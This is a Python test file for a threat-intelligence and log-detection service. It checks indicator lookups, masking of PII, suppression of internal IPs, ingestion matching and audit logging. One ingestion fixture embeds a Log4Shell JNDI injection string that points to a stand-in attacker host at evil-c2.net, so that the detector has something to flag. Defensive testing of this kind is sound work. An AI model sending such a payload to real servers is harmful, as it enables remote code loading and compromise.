"""
LogSentry — TIORE Phase 7 Tests: Threat Intelligence API & Automatic Ingestion Matching
======================================================================================
Verifies manual investigation endpoints, PII privacy protection, match review triage,
observable inventories, audit logging, and automatic ingestion observable correlation.
"""

from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient

from app.core.jwt import create_access_token
from app.main import create_app
from app.tiore.models import ThreatClassification


@pytest.fixture
def api_client():
    app = create_app()
    with TestClient(app) as client:
        yield client


@pytest.fixture
def auth_headers():
    token = create_access_token(
        user_id="analyst-tiore-test",
        role="Tier1_Analyst",
        tenant_id="tenant-tiore",
        extra_claims={"username": "analyst_tiore"},
    )
    return {
        "Authorization": f"Bearer {token}",
        "X-Correlation-ID": "tiore-test-corr-1",
    }


@pytest.fixture
def admin_headers():
    token = create_access_token(
        user_id="admin-tiore-test",
        role="Admin",
        tenant_id="tenant-tiore",
        extra_claims={"username": "admin_tiore"},
    )
    return {
        "Authorization": f"Bearer {token}",
        "X-Correlation-ID": "tiore-admin-corr-1",
    }


def test_tiore_lookup_known_malicious_ip(api_client, auth_headers):
    # Lookup seeded Log4Shell IP
    resp = api_client.post(
        "/api/v1/threat-intel/lookup",
        json={"indicator": "45.155.205.233", "force_external": False},
        headers=auth_headers,
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "success"
    assert data["observable"]["type"] == "ipv4"
    assert data["observable"]["value"] == "45.155.205.233"
    assert data["reputation"]["classification"] == "MALICIOUS"
    assert data["reputation"]["is_match"] is True
    assert "log4shell" in data["reputation"]["threat_types"]
    assert data["audit"]["audited"] is True
    assert data["audit"]["actor_username"] == "analyst_tiore"


def test_tiore_lookup_pii_email_privacy_protection(api_client, auth_headers):
    email = "ciso.executive@enterprise-bank.com"
    resp = api_client.post(
        "/api/v1/threat-intel/lookup",
        json={"indicator": email, "force_external": False},
        headers=auth_headers,
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "success"
    obs = data["observable"]
    assert obs["type"] == "email"
    # Raw email should be masked
    assert obs["masked_value"] == "c***e@enterprise-bank.com"
    assert obs["privacy_classification"] == "pii_sensitive"
    assert obs["is_eligible_for_external_lookup"] is False
    # External disclosure audit should be False
    assert data["audit"]["external_disclosed"] is False


def test_tiore_lookup_internal_rfc1918_suppression(api_client, auth_headers):
    resp = api_client.post(
        "/api/v1/threat-intel/lookup",
        json={"indicator": "10.0.0.88", "force_external": False},
        headers=auth_headers,
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["reputation"]["classification"] == "BENIGN"
    assert data["reputation"]["is_match"] is False
    assert "Internal corporate network" in data["reputation"]["verdict_reason"]


def test_tiore_sources_and_stats_endpoints(api_client, auth_headers):
    # Test sources
    resp_sources = api_client.get("/api/v1/threat-intel/sources", headers=auth_headers)
    assert resp_sources.status_code == 200
    sources = resp_sources.json()
    assert len(sources) >= 6
    source_ids = [s["id"] for s in sources]
    assert "abuseipdb" in source_ids
    assert "virustotal" in source_ids
    assert "urlhaus" in source_ids

    # Test stats
    resp_stats = api_client.get("/api/v1/threat-intel/stats", headers=auth_headers)
    assert resp_stats.status_code == 200
    stats = resp_stats.json()
    assert "total_observables" in stats
    assert "total_matches" in stats
    assert "healthy_sources" in stats


def test_tiore_automatic_ingestion_observable_matching(api_client, auth_headers):
    # Ingest an event containing the known malicious scanner IP 45.155.205.233
    ingest_payload = {
        "event": {
            "timestamp": "2026-11-21T12:00:00Z",
            "parser_name": "apache",
            "source_ip": "45.155.205.233",
            "destination_ip": "10.0.0.15",
            "hostname": "srv-web-prod",
            "method": "GET",
            "endpoint": "/login?token=${jndi:ldap://evil-c2.net:1389/Exploit}",
            "status_code": 200,
            "raw_log": '45.155.205.233 - - [21/Nov/2026:12:00:00 +0000] "GET /login?token=${jndi:ldap://evil-c2.net:1389/Exploit} HTTP/1.1" 200 1234',
            "tenant_id": "tenant-tiore",
        }
    }

    resp = api_client.post("/api/v1/detection/analyze", json=ingest_payload, headers=auth_headers)
    assert resp.status_code == 200

    # Query matches endpoint for tenant-tiore
    resp_matches = api_client.get("/api/v1/threat-intel/matches", headers=auth_headers)
    assert resp_matches.status_code == 200
    matches = resp_matches.json()
    assert len(matches) >= 1

    matched_values = [m["observable_value"] for m in matches]
    assert "45.155.205.233" in matched_values

    # Test review triage on the match
    match_id = matches[0]["id"]
    review_resp = api_client.patch(
        f"/api/v1/threat-intel/matches/{match_id}/review",
        json={"review_status": "confirmed_threat", "notes": "Confirmed active Log4Shell probe targeting DMZ."},
        headers=auth_headers,
    )
    assert review_resp.status_code == 200
    assert review_resp.json()["review_status"] == "confirmed_threat"
    assert review_resp.json()["reviewed_by"] == "analyst_tiore"


def test_tiore_audit_log_endpoint(api_client, auth_headers):
    resp = api_client.get("/api/v1/threat-intel/audit", headers=auth_headers)
    assert resp.status_code == 200
    audits = resp.json()
    assert isinstance(audits, list)
    assert len(audits) >= 1
    assert audits[0]["tenant_id"] == "tenant-tiore"
